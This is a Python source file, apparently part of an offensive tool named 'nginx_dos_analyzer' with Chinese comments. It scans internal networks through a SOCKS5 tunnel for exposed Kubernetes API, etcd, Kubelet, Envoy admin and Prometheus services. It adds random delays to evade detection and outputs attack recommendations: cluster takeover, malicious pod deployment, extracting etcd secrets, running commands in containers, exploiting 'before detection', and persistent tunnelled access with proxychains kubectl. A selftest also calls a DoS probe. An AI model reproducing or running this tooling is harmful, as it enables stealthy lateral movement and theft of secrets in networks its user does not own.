            elif separation_level == "TRADITIONAL_OR_WELL_SECURED" and scan_mode == 'external':
                security_impacts.extend([
                    "Good external security posture - no control plane exposure",
                    "May be traditional architecture or well-secured modern architecture",
                    "Internal reconnaissance needed for definitive assessment"
                ])
        
        except Exception:
            security_impacts.append("Security impact analysis failed")
        
        return security_impacts
    
    async def internal_cluster_scan(self, proxy_info: Dict, target_networks: List[str] = None) -> Dict:
        """
        内网云原生集群扫描 - 与time_mch.py隧道联动
        
        Args:
            proxy_info: SOCKS5代理信息 {'host': '127.0.0.1', 'port': 9999}
            target_networks: 目标网段列表，如 ['192.168.1.0/24', '10.0.0.0/24']
        """
        print(f" [CLUSTER SCAN] Starting internal cloud-native cluster discovery...")
        print(f" [TUNNEL] Using SOCKS5 proxy: {proxy_info['host']}:{proxy_info['port']}")
        
        if not target_networks:
            # 默认扫描常见内网网段
            target_networks = [
                '192.168.1.0/24',
                '10.0.0.0/24', 
                '172.16.0.0/24',
                '192.168.0.0/24'
            ]
        
        cluster_results = {
            'scan_summary': {
                'networks_scanned': len(target_networks),
                'hosts_discovered': 0,
                'cloud_native_hosts': 0,
                'total_endpoints': 0
            },
            'discovered_hosts': [],
            'cloud_native_clusters': [],
            'attack_recommendations': [],
            'tunnel_info': proxy_info
        }
        
        try:
            # 云原生关键端口
            cloud_native_ports = [
                15000,  # Envoy Admin
                15001,  # Envoy Admin (SSL)
                15010,  # Pilot Discovery
                15011,  # Pilot Discovery (SSL)
                15014,  # Pilot Monitoring  
                9901,   # Envoy Admin Alt
                19000,  # Envoy Alt Admin
                8080,   # Common Control Plane
                9090,   # Prometheus/Control Plane
                6443,   # Kubernetes API Server
                2379,   # etcd
                2380,   # etcd peer
                10250,  # Kubelet API
                10256,  # Kube-proxy health
            ]
            
            print(f" [SCAN TARGET] Networks: {', '.join(target_networks)}")
            print(f" [SCAN PORTS] Cloud-native ports: {len(cloud_native_ports)} ports")
            
            for network in target_networks:
                print(f" [NETWORK] Scanning {network}...")
                network_hosts = await self._scan_network_for_cloud_native(
                    network, cloud_native_ports, proxy_info
                )
                
                cluster_results['discovered_hosts'].extend(network_hosts)
                cluster_results['scan_summary']['hosts_discovered'] += len(network_hosts)
                
                # 分析发现的主机
                for host_info in network_hosts:
                    if host_info['cloud_native_score'] >= 3:  # 3个以上云原生端口
                        cluster_results['cloud_native_clusters'].append(host_info)
                        cluster_results['scan_summary']['cloud_native_hosts'] += 1
                    
                    cluster_results['scan_summary']['total_endpoints'] += len(host_info['open_ports'])
            
            # 生成集群分析报告
            cluster_analysis = self._analyze_discovered_clusters(cluster_results['cloud_native_clusters'])
            cluster_results['cluster_analysis'] = cluster_analysis
            
            # 生成攻击建议
            attack_recommendations = self._generate_cluster_attack_recommendations(cluster_results)
            cluster_results['attack_recommendations'] = attack_recommendations
            
            print(f" [CLUSTER SCAN] Complete!")
            print(f" [RESULTS] {cluster_results['scan_summary']['hosts_discovered']} hosts discovered")
            print(f" [CLOUD-NATIVE] {cluster_results['scan_summary']['cloud_native_hosts']} cloud-native hosts found")
            print(f" [ENDPOINTS] {cluster_results['scan_summary']['total_endpoints']} total endpoints discovered")
            
            return cluster_results
            
        except Exception as e:
            cluster_results['error'] = str(e)
            print(f" [ERROR] Cluster scan failed: {e}")
            return cluster_results
    
    async def _scan_network_for_cloud_native(self, network: str, ports: List[int], proxy_info: Dict) -> List[Dict]:
        """扫描网段中的云原生服务"""
        discovered_hosts = []
        
        try:
            # 解析网段
            import ipaddress
            net = ipaddress.ip_network(network, strict=False)
            
            # 限制扫描范围以避免过长时间
            max_hosts = min(50, net.num_addresses - 2)  # 最多扫描50台主机
            host_ips = list(net.hosts())[:max_hosts]
            
            print(f"  [HOSTS] Scanning {len(host_ips)} hosts in {network}")
            
            # 并发扫描主机（控制并发数）
            semaphore = asyncio.Semaphore(10)  # 最多同时扫描10台主机
            
            scan_tasks = []
            for ip in host_ips:
                task = self._scan_single_host_cloud_native(str(ip), ports, proxy_info, semaphore)
                scan_tasks.append(task)
            
            # 批量执行扫描
            scan_results = await asyncio.gather(*scan_tasks, return_exceptions=True)
            
            # 处理扫描结果
            for result in scan_results:
                if isinstance(result, dict) and result.get('ip'):
                    discovered_hosts.append(result)
            
            live_hosts = [h for h in discovered_hosts if h['open_ports']]
            print(f"  [LIVE] {len(live_hosts)} hosts with open cloud-native ports")
            
        except Exception as e:
            print(f"  [ERROR] Network scan failed: {e}")
        
        return discovered_hosts
    
    async def _scan_single_host_cloud_native(self, ip: str, ports: List[int], proxy_info: Dict, semaphore: asyncio.Semaphore) -> Dict:
        """扫描单个主机的云原生端口"""
        async with semaphore:
            host_info = {
                'ip': ip,
                'open_ports': [],
                'cloud_native_score': 0,
                'services': [],
                'envoy_detected': False,
                'k8s_detected': False
            }
            
            try:
                # 随机延迟避免被发现
                await asyncio.sleep(random.uniform(0.1, 0.5))
                
                # 扫描云原生端口
                for port in ports:
                    try:
                        # 使用代理连接
                        reader, writer = await asyncio.wait_for(
                            self._create_proxy_connection_to_host(ip, port, proxy_info),
                            timeout=2.0
                        )
                        
                        # 简单的HTTP探测
                        request = f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n"
                        writer.write(request.encode())
                        await writer.drain()
                        
                        response = await asyncio.wait_for(reader.read(512), timeout=2.0)
                        response_text = response.decode('utf-8', errors='ignore')
                        
                        writer.close()
                        await writer.wait_closed()
                        
                        # 分析响应
                        service_info = self._analyze_cloud_native_response(port, response_text)
                        if service_info:
                            host_info['open_ports'].append(port)
                            host_info['services'].append(service_info)
                            host_info['cloud_native_score'] += service_info['score']
                            
                            if 'envoy' in service_info['type'].lower():
                                host_info['envoy_detected'] = True
                            if 'kubernetes' in service_info['type'].lower() or 'k8s' in service_info['type'].lower():
                                host_info['k8s_detected'] = True
                        
                    except Exception:
                        continue  # 端口不开放或连接失败
                
                if host_info['open_ports']:
                    print(f"       [HOST] {ip} - {len(host_info['open_ports'])} cloud-native ports, score: {host_info['cloud_native_score']}")
                
            except Exception as e:
                pass  # 主机不可达
            
            return host_info
    
    async def _create_proxy_connection_to_host(self, ip: str, port: int, proxy_info: Dict) -> Tuple:
        """通过代理连接到指定主机"""
        if not SOCKS_AVAILABLE:
            raise Exception("SOCKS proxy support not available")
        
        try:
            # 创建SOCKS5代理socket
            proxy_sock = socks.socksocket()
            proxy_sock.set_proxy(socks.SOCKS5, proxy_info['host'], proxy_info['port'])
            
            # 连接到目标主机
            proxy_sock.settimeout(3.0)
            proxy_sock.connect((ip, port))
            
            # 转换为asyncio StreamReader/Writer
            reader, writer = await asyncio.open_connection(sock=proxy_sock)
            return reader, writer
            
        except Exception as e:
            raise Exception(f"Proxy connection to {ip}:{port} failed: {e}")
    
    def _analyze_cloud_native_response(self, port: int, response_text: str) -> Optional[Dict]:
        """分析云原生服务响应"""
        service_info = None
        
        try:
            response_lower = response_text.lower()
            
            # Envoy特征检测
            if port in [15000, 15001, 9901, 19000]:
                envoy_indicators = ['envoy', 'cluster', 'listener', 'upstream', 'stats']
                if any(indicator in response_lower for indicator in envoy_indicators):
                    service_info = {
                        'port': port,
                        'type': 'Envoy_Admin',
                        'score': 4,
                        'evidence': 'Envoy admin interface detected',
                        'criticality': 'HIGH'
                    }
            
            # Kubernetes API检测
            elif port == 6443:
                k8s_indicators = ['kubernetes', 'api', 'version', 'unauthorized']
                if any(indicator in response_lower for indicator in k8s_indicators):
                    service_info = {
                        'port': port,
                        'type': 'Kubernetes_API',
                        'score': 5,
                        'evidence': 'Kubernetes API server detected',
                        'criticality': 'CRITICAL'
                    }
            
            # etcd检测
            elif port in [2379, 2380]:
                etcd_indicators = ['etcd', 'key', 'value', 'cluster']
                if any(indicator in response_lower for indicator in etcd_indicators):
                    service_info = {
                        'port': port,
                        'type': 'etcd_Database',
                        'score': 5,
                        'evidence': 'etcd cluster database detected',
                        'criticality': 'CRITICAL'
                    }
            
            # Kubelet检测
            elif port == 10250:
                kubelet_indicators = ['kubelet', 'pods', 'metrics', 'healthz']
                if any(indicator in response_lower for indicator in kubelet_indicators):
                    service_info = {
                        'port': port,
                        'type': 'Kubelet_API',
                        'score': 4,
                        'evidence': 'Kubelet API detected',
                        'criticality': 'HIGH'
                    }
            
            # Prometheus/Monitoring检测
            elif port == 9090:
                prom_indicators = ['prometheus', 'metrics', 'query', 'graph']
                if any(indicator in response_lower for indicator in prom_indicators):
                    service_info = {
                        'port': port,
                        'type': 'Prometheus_Monitoring',
                        'score': 3,
                        'evidence': 'Prometheus monitoring detected',
                        'criticality': 'MEDIUM'
                    }
            
            # 通用控制面检测
            elif port in [8080, 15010, 15011, 15014]:
                control_indicators = ['pilot', 'discovery', 'xds', 'config']
                if any(indicator in response_lower for indicator in control_indicators):
                    service_info = {
                        'port': port,
                        'type': 'Control_Plane',
                        'score': 3,
                        'evidence': 'Control plane service detected',
                        'criticality': 'MEDIUM'
                    }
            
            # 通用HTTP服务检测
            elif 'http' in response_lower and '200' in response_text:
                service_info = {
                    'port': port,
                    'type': 'HTTP_Service',
                    'score': 1,
                    'evidence': 'HTTP service responding',
                    'criticality': 'LOW'
                }
        
        except Exception:
            pass
        
        return service_info
    
    def _analyze_discovered_clusters(self, cloud_native_hosts: List[Dict]) -> Dict:
        """分析发现的云原生集群"""
        analysis = {
            'cluster_architecture': 'Unknown',
            'security_posture': 'Unknown',
            'attack_priority': [],
            'cluster_components': {}
        }
        
        try:
            if not cloud_native_hosts:
                return analysis
            
            # 统计组件类型
            component_count = {}
            critical_hosts = []
            
            for host in cloud_native_hosts:
                for service in host['services']:
                    service_type = service['type']
                    if service_type not in component_count:
                        component_count[service_type] = 0
                    component_count[service_type] += 1
                    
                    if service['criticality'] == 'CRITICAL':
                        critical_hosts.append({
                            'ip': host['ip'],
                            'service': service_type,
                            'port': service['port']
                        })
            
            analysis['cluster_components'] = component_count
            
            # 判断架构类型
            if 'Kubernetes_API' in component_count:
                analysis['cluster_architecture'] = 'Kubernetes_Cluster'
            elif 'Envoy_Admin' in component_count and component_count['Envoy_Admin'] > 1:
                analysis['cluster_architecture'] = 'Service_Mesh'
            elif 'Envoy_Admin' in component_count:
                analysis['cluster_architecture'] = 'Envoy_Gateway'
            else:
                analysis['cluster_architecture'] = 'Custom_Cloud_Native'
            
            # 安全态势评估
            if critical_hosts:
                analysis['security_posture'] = 'CRITICAL_EXPOSURE'
                analysis['attack_priority'] = critical_hosts[:5]  # 前5个最危险的目标
            elif len(cloud_native_hosts) >= 3:
                analysis['security_posture'] = 'HIGH_EXPOSURE'
            else:
                analysis['security_posture'] = 'MODERATE_EXPOSURE'
        
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def _generate_cluster_attack_recommendations(self, cluster_results: Dict) -> List[str]:
        """生成集群攻击建议"""
        recommendations = []
        
        try:
            cluster_analysis = cluster_results.get('cluster_analysis', {})
            cloud_native_hosts = cluster_results.get('cloud_native_clusters', [])
            
            # 基于架构类型的建议
            arch_type = cluster_analysis.get('cluster_architecture', 'Unknown')
            if arch_type == 'Kubernetes_Cluster':
                recommendations.extend([
                    " Kubernetes cluster detected - target API server for cluster takeover",
                    " Enumerate service accounts and RBAC permissions",
                    " Deploy malicious pods for privilege escalation",
                    " Examine container registries and secrets"
                ])
            elif arch_type == 'Service_Mesh':
                recommendations.extend([
                    " Service mesh detected - target Envoy admin interfaces",
                    " Manipulate traffic routing for data interception",
                    " Bypass service-to-service security policies",
                    " Extract service topology from control plane"
                ])
            elif arch_type == 'Envoy_Gateway':
                recommendations.extend([
                    " Envoy gateway detected - focus on configuration injection",
                    " Access admin interface for traffic manipulation",
                    " Modify routing rules for request interception"
                ])
            
            # 基于发现的服务类型
            components = cluster_analysis.get('cluster_components', {})
            if 'etcd_Database' in components:
                recommendations.append(" CRITICAL: etcd exposed - extract all cluster secrets and configurations")
            if 'Kubelet_API' in components:
                recommendations.append(" Kubelet API accessible - execute commands in running containers")
            if 'Prometheus_Monitoring' in components:
                recommendations.append(" Prometheus exposed - harvest metrics for reconnaissance")
            
            # 基于安全态势
            security_posture = cluster_analysis.get('security_posture', 'Unknown')
            if security_posture == 'CRITICAL_EXPOSURE':
                recommendations.insert(0, " IMMEDIATE ACTION: Critical cluster components exposed to internal network")
                recommendations.append(" Prioritize rapid exploitation before detection")
            
            # 隧道特定建议
            proxy_info = cluster_results.get('tunnel_info', {})
            if proxy_info:
                recommendations.extend([
                    f" Leverage established SOCKS5 tunnel: {proxy_info['host']}:{proxy_info['port']}",
                    " Use proxychains for tool access: proxychains kubectl --insecure-skip-tls-verify",
                    " Establish additional port forwards for persistent access"
                ])
        
        except Exception as e:
            recommendations.append(f" Recommendation analysis failed: {e}")
        
        return recommendations

async def selftest(target="127.0.0.1", timeout=3.0, verbose=True):
    """nginx_dos_analyzer模块自检"""
    if verbose:
        print("[*] nginx_dos_analyzer selftest starting...")
    
    try:
        # 基础功能测试
        analyzer = NginxDoSAnalyzer(target, 80, timeout=timeout)
        
        # 测试DoS探测逻辑
        if verbose:
            print("  [+] Testing DoS probe logic...")
        dos_result = await analyzer.nginx_dos_sandwich_probe()
        
        # 测试云原生架构检测
        if verbose:
            print("  [+] Testing cloud-native detection...")
        cloud_result = await analyzer.detect_cloud_native_architecture(scan_mode='external')
        
        if verbose:
            print("  [+] nginx_dos_analyzer selftest completed successfully")
        return True
        
    except Exception as e:
        if verbose:
            print(f"  [-] nginx_dos_analyzer selftest failed: {e}")
        return False

def main():
    import argparse
    import sys
    
    parser = argparse.ArgumentParser(description="Nginx DoS + Cloud-Native Architecture Analyzer")
    parser.add_argument("--selftest", action="store_true", help="Run module self-test")
    parser.add_argument("--target", default="127.0.0.1", help="Target host for testing")
    parser.add_argument("--timeout", type=float, default=3.0, help="Timeout for operations")
    
    args = parser.parse_args()
    
    if args.selftest:
        try:
            result = asyncio.run(selftest(args.target, args.timeout))
            sys.exit(0 if result else 1)
        except KeyboardInterrupt:
            print("\n[!] Selftest interrupted")
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()